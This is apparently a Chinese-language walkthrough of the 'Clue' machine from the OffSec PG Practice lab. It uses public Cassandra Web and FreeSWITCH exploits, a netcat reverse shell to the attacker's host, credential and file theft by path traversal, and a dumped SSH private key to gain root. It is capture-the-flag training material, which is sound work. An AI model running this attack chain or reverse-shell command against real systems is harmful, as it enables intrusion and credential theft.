###### tags: `Offsec` `PG Practice` `Hard` `Linux`

# Clue
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.181.240 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.181.240:22
Open 192.168.181.240:80
Open 192.168.181.240:139
Open 192.168.181.240:3000
Open 192.168.181.240:445
Open 192.168.181.240:8021

PORT     STATE SERVICE          REASON  VERSION
22/tcp   open  ssh              syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             syn-ack Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn      syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             syn-ack Thin httpd
|_http-title: Cassandra Web
|_http-server-header: thin
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
8021/tcp open  freeswitch-event syn-ack FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

查看`http://192.168.181.240:3000/`，去google可找到[edb-49362](https://www.exploit-db.com/exploits/49362)可以參考裡面的用法
```
┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49362.py 192.168.181.240 /proc/self/cmdline

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

不能用`cassie`進行ssh，再查看[edb-47799](https://www.exploit-db.com/exploits/47799)更改PASSWORD`SecondBiteTheApple330`，但是一直fail
```
ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='SecondBiteTheApple330' # default password for FreeSWITCH

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 47799.py 192.168.181.240 "whoami"       
Authentication failed
```

往smb去，google[How to change FreeSWITCH event socket password?](https://inextrix.atlassian.net/wiki/spaces/ASTPP/pages/5572241/How+to+change+FreeSWITCH+event+socket+password)他說預設路徑為`/usr/local/freeswitch/conf/autoload_configs/event_socket.conf.xmll`，結果我找到在/etc裡面..，嘗試用剛剛的`49362.py`來找
```
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N -L 192.168.181.240 

Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
        
┌──(kali㉿kali)-[~/pgplay]
└─$ smbclient -N //192.168.181.240/backup

smb: \freeswitch\etc\freeswitch\autoload_configs\> get event_socket.conf.xml

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49362.py 192.168.181.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

得密碼為`StrongClueConEight021`再改一次
```
ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='StrongClueConEight021' # default password for FreeSWITCH

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp3000

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 47799.py 192.168.181.240 "nc -c /bin/sh 192.168.45.245 3000"                                                     
Authenticated
```

登入之後，在`/var/lib/freeswitch/`找到local.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
freeswitch@clue:/$ find / -name "local.txt" 2>/dev/null
find / -name "local.txt" 2>/dev/null
/var/lib/freeswitch/local.txt
freeswitch@clue:/var/lib/freeswitch$ cat local.txt
558eb3f2c47ca82f21accd3413725dff
```

可以利用剛剛得`到cassie`的密碼切過去，查看`sudo -l`，執行`/usr/local/bin/cassandra-web`可看到可以利sudo權限再開一個`cassandra-web`
```
freeswitch@clue:/home/cassie$ su cassie
Password: SecondBiteTheApple330
cassie@clue:~$ sudo -l
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web

cassie@clue:~$ /usr/local/bin/cassandra-web
/usr/local/bin/cassandra-web
I, [2024-05-10T04:04:04.806057 #16191]  INFO -- : Establishing control connection
W, [2024-05-10T04:04:04.809156 #16191]  WARN -- : Host 127.0.0.1 refused all connections
Cassandra::Errors::AuthenticationError: Server requested authentication, but client was not configured to authenticate

Usage: cassandra-web [options]
    -B, --bind BIND                  ip:port or path for cassandra web to bind on (default: 0.0.0.0:3000)
    -H, --hosts HOSTS                coma-separated list of cassandra hosts (default: 127.0.0.1)
    -P, --port PORT                  integer port that cassandra is running on (default: 9042)
    -L, --log-level LEVEL            log level (default: info)
    -u, --username USER              username to use when connecting to cassandra
    -p, --password PASS              password to use when connecting to cassandra
    -C, --compression NAME           compression algorithm to use (lz4 or snappy)
        --server-cert PATH           server ceritificate pathname
        --client-cert PATH           client ceritificate pathname
        --private-key PATH           path to private key
        --passphrase SECRET          passphrase for the private key
    -h, --help                       Show help
    
```

有權限之後再用相同的漏洞查看`anthony`的資料夾，還要再用同樣的方式再拿一個cassie的shell來curl，curl看看`anthony`的資料夾，發現他是root，來看`id_rsa`
```
cassie@clue:/tmp$ sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330

cassie@clue:/$ curl --path-as-is localhost:4444/../../../../../../../../home/anthony/.bash_history
</../../../../../../../../home/anthony/.bash_history
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit

cassie@clue:/$ curl --path-as-is localhost:4444/../../../../../../../../home/anthony/.ssh/id_rsa
<44/../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

登入之後，發現proof是`proof_youtriedharder.txt`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ chmod 600 anthony.id_rsa

┌──(kali㉿kali)-[~/pgplay]
└─$ ssh -i anthony.id_rsa root@192.168.181.240

root@clue:~# cd /root
root@clue:~# ls
proof.txt  proof_youtriedharder.txt  smbd.sh
root@clue:~# cat proof.txt
The proof is in another file
root@clue:~# cat proof_youtriedharder.txt
8b9e0598d7a9f46b9f6c8beffe405a52
```

---